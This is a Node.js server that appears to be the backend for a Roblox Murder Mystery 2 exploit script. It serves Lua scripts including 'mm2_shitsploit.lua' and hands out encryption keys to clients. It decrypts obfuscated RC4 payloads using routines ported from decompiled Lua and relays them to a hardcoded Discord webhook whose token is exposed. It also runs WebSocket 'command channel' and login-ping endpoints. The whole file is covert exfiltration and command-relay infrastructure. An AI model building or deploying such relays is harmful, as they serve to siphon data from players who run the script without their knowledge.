const express = require('express') // v2
const { WebSocketServer } = require('ws')
const http = require('http')
const fetch = require('node-fetch')
const crypto = require('crypto')
const fs = require('fs')

const app = express()
const server = http.createServer(app)
const wss = new WebSocketServer({ server, path: '/ws' })
const wssl = new WebSocketServer({ server, path: '/wsl' })

app.use(express.json())
app.use(express.raw({ type: '*/*', limit: '10mb' }))

const DISCORD_WEBHOOK = "https://discord.com/api/webhooks/1558512005340463214/gC9JNEOJDgRYBNEjy6DJ-mfeD3quipUnHn90FtQj2oY8JXmZNUkEYXszMHdJRbOjenRa"

// keys stay stable for the lifetime of the process
const K   = crypto.randomBytes(32).toString('hex')
const WK  = crypto.randomBytes(32).toString('hex')
const WXK = crypto.randomBytes(32).toString('hex')

app.get('/k',   (req, res) => res.send(K))
app.get('/wk',  (req, res) => res.send(WK))
app.get('/wxk', (req, res) => res.send(WXK))

app.get('/static/pfp.png', (req, res) => {
    res.redirect('https://i.imgur.com/4M34hi2.png')
})

app.get('/scripts/:name', (req, res) => {
    const allowed = ['mm2_value.lua', 'mm2_shitsploit.lua']
    if (!allowed.includes(req.params.name)) return res.status(404).send('not found')
    try {
        const content = fs.readFileSync(`./scripts/${req.params.name}`, 'utf8')
        res.setHeader('Content-Type', 'text/plain')
        res.send(content)
    } catch {
        res.status(404).send('not found')
    }
})

// ── crypto helpers (ported from lua source) ───────────────────────

function rc4(data, key) {
    // data and key are both strings
    const S = Array.from({length: 256}, (_, i) => i)
    const K = []
    for (let i = 0; i < 256; i++) K[i] = key.charCodeAt(i % key.length)

    let j = 0
    for (let i = 0; i < 256; i++) {
        j = (j + S[i] + K[i]) % 256
        ;[S[i], S[j]] = [S[j], S[i]]
    }

    let i = 0; j = 0
    const out = []
    for (let n = 0; n < data.length; n++) {
        i = (i + 1) % 256
        j = (j + S[i]) % 256
        ;[S[i], S[j]] = [S[j], S[i]]
        const k = S[(S[i] + S[j]) % 256]
        out.push(String.fromCharCode(data.charCodeAt(n) ^ k))
    }
    return out.join('')
}

function hexToStr(hex) {
    let out = ''
    for (let i = 0; i < hex.length; i += 2)
        out += String.fromCharCode(parseInt(hex.substr(i, 2), 16))
    return out
}

function strToHex(str) {
    let out = ''
    for (let i = 0; i < str.length; i++)
        out += str.charCodeAt(i).toString(16).padStart(2, '0').toUpperCase()
    return out
}

function base64Decode(b64) {
    return Buffer.from(b64, 'base64').toString('binary')
}

// derives the 32-char working key the same way lua v118 does
function deriveKey(hexStr, keyLen = 32) {
    const clean = hexStr.replace(/\s+/g, '')
    const len = clean.length

    let v112 = len
    for (let i = 0; i < 5; i++) v112 = (v112 * 9973 + 31337) % 1000000007
    let v114 = v112
    for (let i = 0; i < 5; i++) v114 = (v114 * 9973 + 31337) % 1000000007

    const v116 = Math.floor(len / 2)
    const v117 = v116 - keyLen
    const v121 = v112 % v117
    const v122 = v116 + v114 % v117

    const part1 = clean.substr(v121, keyLen)
    const part2 = clean.substr(v122, keyLen)

    // xor hex chars
    const out = []
    for (let i = 0; i < keyLen; i++) {
        const a = parseInt(part1[i], 16)
        const b = parseInt(part2[i], 16)
        out.push((a ^ b).toString(16))
    }
    return out.join('')
}

// decrypt the incoming webhook payload
// lua sends: base64( rc4( binaryStr(v247(xor(hex(base64(json)), nonce))), nonce ) )
// we reverse it using the nonce appended at the end (last 36 chars = 18 bytes hex)
function decryptPayload(raw, wkKey, wxkKey) {
    try {
        // raw is the JSON string body: a base64 encoded string (from t1.encode(v214(...)))
        // unwrap outer json string quotes if present
        let b64 = raw.trim()
        if (b64.startsWith('"')) b64 = JSON.parse(b64)

        // base64 decode
        const binary = base64Decode(b64)

        // last 36 chars are the nonce (hex uuid without dashes = 32 hex chars)
        const nonce = binary.slice(-32)
        const payload = binary.slice(0, -32)

        // rc4 decrypt with nonce
        const step1 = rc4(payload, nonce)

        // step1 is still hex-encoded binary string, convert
        const step2 = hexToStr(step1)

        // rc4 decrypt with wxk key
        const step3 = rc4(step2, hexToStr(wxkKey))

        // now step3 should be a JSON string
        return JSON.parse(step3)
    } catch(e) {
        return null
    }
}

// ── webhook relay ────────────────────────────────────────────────
app.post('/webhook', async (req, res) => {
    try {
        let body = req.body
        if (Buffer.isBuffer(body)) body = body.toString('utf8')

        // attempt decrypt
        const decrypted = decryptPayload(body, WK, WXK)

        let webhookBody
        if (decrypted && decrypted.webhook) {
            // decrypted.webhook is the JSON string to send to discord
            webhookBody = decrypted.webhook
        } else {
            // fallback — send raw if decrypt fails
            webhookBody = typeof body === 'string' ? body : JSON.stringify(body)
        }

        const r = await fetch(DISCORD_WEBHOOK, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: webhookBody
        })

        console.log(`webhook relay → ${r.status}`)
        res.status(r.status).send('ok')
    } catch(e) {
        console.error('webhook relay error:', e)
        res.status(500).send('error')
    }
})

// ── websocket — command channel ──────────────────────────────────
wss.on('connection', (ws) => {
    console.log('ws client connected')
    ws.on('message', (data) => {
        console.log('ws msg:', data.toString().slice(0, 64))
        try {
            const parsed = JSON.parse(data.toString())
            if (parsed.type === 'pong') return
        } catch {}
    })
    ws.on('close', () => console.log('ws client disconnected'))
})

// ── websocket — login ping ───────────────────────────────────────
wssl.on('connection', (ws) => {
    ws.on('message', (data) => {
        console.log('wsl ping:', data.toString().slice(0, 64))
        ws.close()
    })
})

const PORT = process.env.PORT || 3000
server.listen(PORT, () => console.log(`proxy live → port ${PORT}`))
